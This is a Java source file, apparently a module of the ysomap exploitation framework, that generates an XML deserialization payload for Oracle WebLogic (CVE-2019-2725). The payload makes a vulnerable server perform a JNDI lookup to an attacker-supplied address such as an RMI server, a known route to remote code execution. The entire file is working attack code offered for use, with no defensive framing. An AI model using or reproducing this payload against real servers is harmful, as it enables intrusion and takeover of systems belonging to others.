package ysomap.core.bullet.weblogic.xml;

import ysomap.common.annotation.Bullets;
import ysomap.common.annotation.NotNull;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;

/**
 * new payload founded at 20210408
 * 适用于10.3.6 12.x
 * 需要环境JDK7
 * CVE-2019-2725
 * @author wh1t3P1g
 * @since 2021/4/8
 */
@Bullets
public class WeblogicXMLJndiBullet extends Bullet<String> {

    @NotNull
    @Require(name = "jndiURL", detail = "jndi lookup url, like rmi://xxxx:1099/xxx")
    public String jndiURL;

    @Override
    public String getObject() throws Exception {
        return "<java><class><string>weblogic.jms.forwarder.internal.SessionRuntimeContextImpl</string>" +
                "<void><null><string></string></null><string></string><string></string><string>"+
                jndiURL +"</string></void></class>" +
                "</java>";
    }
}
